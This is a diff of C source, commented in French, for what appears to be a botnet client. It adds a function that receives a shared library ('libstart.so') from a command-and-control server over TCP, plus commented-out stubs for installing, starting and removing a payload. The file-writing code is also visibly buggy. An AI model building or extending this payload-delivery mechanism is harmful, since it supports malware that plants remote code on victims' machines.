@@ -19,8 +19,29 @@
 #define PORT_TCP_CLIENT 4242
 #define PORT_TCP_SERVEUR "4242"
 #define TAILLE_STRUCTURE 32
+#define MAX 1000
 
 extern clock_t debut;
+/* 
+void get_status(info_bot_t info, int socket_tcp)
+{
+    char status = info.etat;
+    if (write(socket_tcp, status, sizeof(char)) < 0)
+    {
+    };
+}
+
+void install_charge()
+{
+}
+
+void start_charge()
+{
+}
+
+void rm_charge()
+{
+} */
 
 /**
  * void gestionClientTCP(void *s)
@@ -47,6 +68,32 @@ void gestionClientTCP(void *s)
     fclose(dialogue);
     return;
 }
+/**
+ * void recvFile(void *s)
+ * Fonction qui reçoi le fichier.so envoyé par le CC
+ * elle le receptionne et le crée dans son dossier
+ * param pointeur vers la socket TCP
+ */
+void recvFile(void *s)
+{
+    int socket_tcp = *((int *)s);
+    char buff[MAX]; // to store message from client
+
+    FILE *fp;
+    fp = fopen("libstart.so", "w"); // stores the file content in recieved.txt in the program directory
+
+    if (fp == NULL)
+    {
+        printf("Error IN Opening File ");
+        return;
+    }
+
+    while (read(socket_tcp , buff, MAX) > 0)
+        fprintf(fp, "%s", buff);
+
+    printf("File received successfully !! \n");
+    printf("New File created is libstart.so !! \n");
+}
 
 /**
  * void nouveauClient(int dialogue)
@@ -56,7 +103,7 @@ void gestionClientTCP(void *s)
 void nouveauClient(int dialogue)
 {
     printf("[nouveauClient]Start\n");
-    if (lanceThread(gestionClientTCP, (void *)&dialogue, sizeof(dialogue)) < 0)
+    if (lanceThread(recvFile, (void *)&dialogue, sizeof(dialogue)) < 0)
     {
         perror("nouveauClient.lanceThread");
         exit(-1);
